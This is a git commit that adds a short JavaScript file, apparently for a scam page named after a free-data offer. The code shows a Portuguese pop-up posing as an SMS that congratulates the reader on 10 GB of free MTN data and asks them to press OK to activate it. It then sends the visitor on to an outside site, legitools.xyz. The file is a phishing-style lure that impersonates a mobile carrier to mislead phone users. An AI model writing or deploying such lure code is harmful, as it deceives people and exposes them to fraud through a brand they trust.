c9d592c2e0fd80e62a50ec2da2752a5575c04f5f
katemj25 <mbokofficial1@gmail.com>
2025-07-17 14:34:01 -0700

    Create mtn-free10gb.com.js

---
+++ mtn-free10gb.com.js
@@ -0,0 +1,5 @@
+var password = 'Dados Gratuitos Mtn'
+password=prompt('SMS: Parabéns! Seu número é elegível para receber 10 GB de dados grátis do bônus restaurado da Mtn. Pressione OK para ATIVAR.. ','Dados Gratuitos Mtn');
+if (password != 'Dados Gratuitos Mtn') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
